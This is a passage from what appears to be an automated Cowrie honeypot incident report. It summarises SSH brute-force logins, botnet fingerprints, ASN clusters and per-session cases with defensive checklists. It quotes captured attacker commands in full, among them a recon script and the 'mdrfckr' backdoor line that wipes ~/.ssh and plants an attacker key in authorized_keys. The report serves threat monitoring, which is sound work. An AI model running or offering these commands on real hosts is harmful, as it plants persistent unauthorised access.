| `postgres` | `1234` | `24.97.253.246` | 2026-07-15T12:44:16 |
| `postgres` | `1234` | `218.58.73.238` | 2026-07-15T12:44:27 |
| `postgres` | `1234` | `10.0.0.73` | 2026-07-15T12:48:19 |
| `ubuntu` | `*` | `103.61.122.229` | 2026-07-15T12:50:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **248** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 52 |
| libssh | 39 |
| Go SSH scanner | 32 |
| Paramiko (Python) | 18 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 48 | 48 |
| `16443846184e...` | Generic scanner | 17 | 3 |
| `f555226df196...` | Mirai/variant | 16 | 6 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 48 | 48 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 17 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 16 | 7 | — |
| `f555226df196...` | libssh | 16 | 6 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `ae8bd7dd0997...` | OpenSSH | 4 | 1 | Modern SSH client |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 2 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.176`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `61.76.38.54`, `190.244.39.224`, `64.186.241.50`, `160.22.170.237`, `163.7.3.26`, `121.142.87.218`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **129** |
| Unique ASNs | **74** |
| High-Risk ASNs | **62** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 12 | HIGH |
| `AS46562` | Performive LLC | 8 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 8 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (118)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a3dc75161eb9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 09:08 |
| **Last Seen** | 2026-07-15 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:08:53` | `cowrie.session.connect` |
| `2026-07-15 09:08:53` | `cowrie.client.version` |
| `2026-07-15 09:08:53` | `cowrie.client.kex` |
| `2026-07-15 09:08:53` | `cowrie.login.success` |
| `2026-07-15 09:08:54` | `cowrie.session.params` |
| `2026-07-15 09:08:54` | `cowrie.command.input` |
| `2026-07-15 09:08:54` | `cowrie.log.closed` |
| `2026-07-15 09:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d16ddfed0fc8

| Field | Detail |
|---|---|
| **Source IP** | `124.167.20[.]72` |
| **First Seen** | 2026-07-15 09:11 |
| **Last Seen** | 2026-07-15 09:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:11:36` | `cowrie.session.connect` |
| `2026-07-15 09:11:37` | `cowrie.client.version` |
| `2026-07-15 09:11:37` | `cowrie.client.kex` |
| `2026-07-15 09:11:39` | `cowrie.login.success` |
| `2026-07-15 09:11:39` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.167.20[.]72` to AbuseIPDB if not already reported
- [ ] Block `124.167.20[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e16fed8f1415

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]52` |
| **First Seen** | 2026-07-15 09:14 |
| **Last Seen** | 2026-07-15 09:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:14:43` | `cowrie.session.connect` |
| `2026-07-15 09:14:44` | `cowrie.client.version` |
| `2026-07-15 09:14:44` | `cowrie.client.kex` |
| `2026-07-15 09:14:46` | `cowrie.login.success` |
| `2026-07-15 09:14:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca36bd4cad60

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-07-15 09:18 |
| **Last Seen** | 2026-07-15 09:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:18:01` | `cowrie.session.connect` |
| `2026-07-15 09:18:02` | `cowrie.client.version` |
| `2026-07-15 09:18:02` | `cowrie.client.kex` |
| `2026-07-15 09:18:04` | `cowrie.login.success` |
| `2026-07-15 09:18:05` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e339d1289b33

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-15 09:18 |
| **Last Seen** | 2026-07-15 09:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:18:15` | `cowrie.session.connect` |
| `2026-07-15 09:18:16` | `cowrie.client.version` |
| `2026-07-15 09:18:16` | `cowrie.client.kex` |
| `2026-07-15 09:18:17` | `cowrie.login.success` |
| `2026-07-15 09:18:17` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf7b82d02a7a

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-07-15 09:25 |
| **Last Seen** | 2026-07-15 09:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:25:02` | `cowrie.session.connect` |
| `2026-07-15 09:25:02` | `cowrie.client.version` |
| `2026-07-15 09:25:02` | `cowrie.client.kex` |
| `2026-07-15 09:25:03` | `cowrie.login.success` |
| `2026-07-15 09:25:04` | `cowrie.session.params` |
| `2026-07-15 09:25:04` | `cowrie.command.input` |
| `2026-07-15 09:25:04` | `cowrie.command.failed` |
| `2026-07-15 09:25:04` | `cowrie.log.closed` |
| `2026-07-15 09:25:05` | `cowrie.session.params` |
| `2026-07-15 09:25:05` | `cowrie.command.input` |
| `2026-07-15 09:25:05` | `cowrie.session.file_download` |
| `2026-07-15 09:25:05` | `cowrie.log.closed` |
| `2026-07-15 09:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03f0eff6e80

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-07-15 09:25 |
| **Last Seen** | 2026-07-15 09:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:25:05` | `cowrie.session.connect` |
| `2026-07-15 09:25:05` | `cowrie.client.version` |
| `2026-07-15 09:25:05` | `cowrie.client.kex` |
| `2026-07-15 09:25:06` | `cowrie.login.success` |
| `2026-07-15 09:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67445139dc5e

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-07-15 09:25 |
| **Last Seen** | 2026-07-15 09:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:25:06` | `cowrie.session.connect` |
| `2026-07-15 09:25:06` | `cowrie.client.version` |
| `2026-07-15 09:25:07` | `cowrie.client.kex` |
| `2026-07-15 09:25:07` | `cowrie.login.success` |
| `2026-07-15 09:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bef8c2e4368d

| Field | Detail |
|---|---|
| **Source IP** | `120.52.18[.]119` |
| **First Seen** | 2026-07-15 09:32 |
| **Last Seen** | 2026-07-15 09:37 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:32:31` | `cowrie.session.connect` |
| `2026-07-15 09:32:32` | `cowrie.client.version` |
| `2026-07-15 09:32:32` | `cowrie.client.kex` |
| `2026-07-15 09:32:33` | `cowrie.login.success` |
| `2026-07-15 09:32:34` | `cowrie.session.params` |
| `2026-07-15 09:32:34` | `cowrie.command.input` |
| `2026-07-15 09:32:34` | `cowrie.command.failed` |
| `2026-07-15 09:32:35` | `cowrie.log.closed` |
| `2026-07-15 09:32:36` | `cowrie.session.params` |
| `2026-07-15 09:32:36` | `cowrie.command.input` |
| `2026-07-15 09:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.18[.]119` to AbuseIPDB if not already reported
- [ ] Block `120.52.18[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02bc51abedb0

| Field | Detail |
|---|---|
| **Source IP** | `36.154.134[.]146` |
| **First Seen** | 2026-07-15 09:37 |
| **Last Seen** | 2026-07-15 09:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:37:18` | `cowrie.session.connect` |
| `2026-07-15 09:37:18` | `cowrie.client.version` |
| `2026-07-15 09:37:18` | `cowrie.client.kex` |
| `2026-07-15 09:37:21` | `cowrie.login.success` |
| `2026-07-15 09:37:21` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.154.134[.]146` to AbuseIPDB if not already reported
- [ ] Block `36.154.134[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-511236c861a7

| Field | Detail |
|---|---|
| **Source IP** | `121.159.71[.]249` |
| **First Seen** | 2026-07-15 09:37 |
| **Last Seen** | 2026-07-15 09:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:37:32` | `cowrie.session.connect` |
| `2026-07-15 09:37:33` | `cowrie.client.version` |
| `2026-07-15 09:37:33` | `cowrie.client.kex` |
| `2026-07-15 09:37:35` | `cowrie.login.success` |
| `2026-07-15 09:37:36` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.159.71[.]249` to AbuseIPDB if not already reported
- [ ] Block `121.159.71[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3d3b04c865

| Field | Detail |
|---|---|
| **Source IP** | `66.175.213[.]4` |
| **First Seen** | 2026-07-15 09:39 |
| **Last Seen** | 2026-07-15 09:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:39:01` | `cowrie.session.connect` |
| `2026-07-15 09:39:01` | `cowrie.login.success` |
| `2026-07-15 09:39:02` | `cowrie.session.params` |
| `2026-07-15 09:39:02` | `cowrie.command.input` |
| `2026-07-15 09:39:02` | `cowrie.command.input` |
| `2026-07-15 09:39:02` | `cowrie.command.failed` |
| `2026-07-15 09:39:02` | `cowrie.command.input` |
| `2026-07-15 09:39:02` | `cowrie.command.failed` |
| `2026-07-15 09:39:02` | `cowrie.command.input` |
| `2026-07-15 09:39:02` | `cowrie.log.closed` |
| `2026-07-15 09:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.175.213[.]4` to AbuseIPDB if not already reported
- [ ] Block `66.175.213[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90dc21968220

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]23` |
| **First Seen** | 2026-07-15 09:41 |
| **Last Seen** | 2026-07-15 09:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:41:00` | `cowrie.session.connect` |
| `2026-07-15 09:41:01` | `cowrie.client.version` |
| `2026-07-15 09:41:01` | `cowrie.client.kex` |
| `2026-07-15 09:41:03` | `cowrie.login.success` |
| `2026-07-15 09:41:04` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]23` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-add9890b6e2a

| Field | Detail |
|---|---|
| **Source IP** | `218.59.235[.]170` |
| **First Seen** | 2026-07-15 09:43 |
| **Last Seen** | 2026-07-15 09:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:43:36` | `cowrie.session.connect` |
| `2026-07-15 09:43:36` | `cowrie.client.version` |
| `2026-07-15 09:43:36` | `cowrie.client.kex` |
| `2026-07-15 09:43:38` | `cowrie.login.success` |
| `2026-07-15 09:43:39` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.59.235[.]170` to AbuseIPDB if not already reported
- [ ] Block `218.59.235[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a3e4bd40d2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-07-15 09:43 |
| **Last Seen** | 2026-07-15 09:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:43:44` | `cowrie.session.connect` |
| `2026-07-15 09:43:45` | `cowrie.client.version` |
| `2026-07-15 09:43:45` | `cowrie.client.kex` |
| `2026-07-15 09:43:47` | `cowrie.login.success` |
| `2026-07-15 09:43:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07828869260d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 09:45 |
| **Last Seen** | 2026-07-15 09:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:45:28` | `cowrie.session.connect` |
| `2026-07-15 09:45:28` | `cowrie.client.version` |
| `2026-07-15 09:45:28` | `cowrie.client.kex` |
| `2026-07-15 09:45:28` | `cowrie.login.success` |
| `2026-07-15 09:45:29` | `cowrie.session.params` |
| `2026-07-15 09:45:29` | `cowrie.command.input` |
| `2026-07-15 09:45:29` | `cowrie.log.closed` |
| `2026-07-15 09:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a9ec1a84e04

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 09:45 |
| **Last Seen** | 2026-07-15 09:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:45:33` | `cowrie.session.connect` |
| `2026-07-15 09:45:33` | `cowrie.client.version` |
| `2026-07-15 09:45:33` | `cowrie.client.kex` |
| `2026-07-15 09:45:33` | `cowrie.login.success` |
| `2026-07-15 09:45:33` | `cowrie.direct-tcpip.request` |
| `2026-07-15 09:45:34` | `cowrie.direct-tcpip.data` |
| `2026-07-15 09:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f49ad0ee702

| Field | Detail |
|---|---|
| **Source IP** | `209.97.183[.]158` |
| **First Seen** | 2026-07-15 09:47 |
| **Last Seen** | 2026-07-15 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:47:53` | `cowrie.session.connect` |
| `2026-07-15 09:47:53` | `cowrie.client.version` |
| `2026-07-15 09:47:53` | `cowrie.client.kex` |
| `2026-07-15 09:47:53` | `cowrie.login.success` |
| `2026-07-15 09:47:54` | `cowrie.session.params` |
| `2026-07-15 09:47:54` | `cowrie.command.input` |
| `2026-07-15 09:47:54` | `cowrie.log.closed` |
| `2026-07-15 09:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.183[.]158` to AbuseIPDB if not already reported
- [ ] Block `209.97.183[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0100a8270db

| Field | Detail |
|---|---|
| **Source IP** | `209.97.183[.]158` |
| **First Seen** | 2026-07-15 09:50 |
| **Last Seen** | 2026-07-15 09:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:50:20` | `cowrie.session.connect` |
| `2026-07-15 09:50:20` | `cowrie.client.version` |
| `2026-07-15 09:50:20` | `cowrie.client.kex` |
| `2026-07-15 09:50:20` | `cowrie.login.success` |
| `2026-07-15 09:50:21` | `cowrie.session.params` |
| `2026-07-15 09:50:21` | `cowrie.command.input` |
| `2026-07-15 09:50:21` | `cowrie.log.closed` |
| `2026-07-15 09:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.183[.]158` to AbuseIPDB if not already reported
- [ ] Block `209.97.183[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

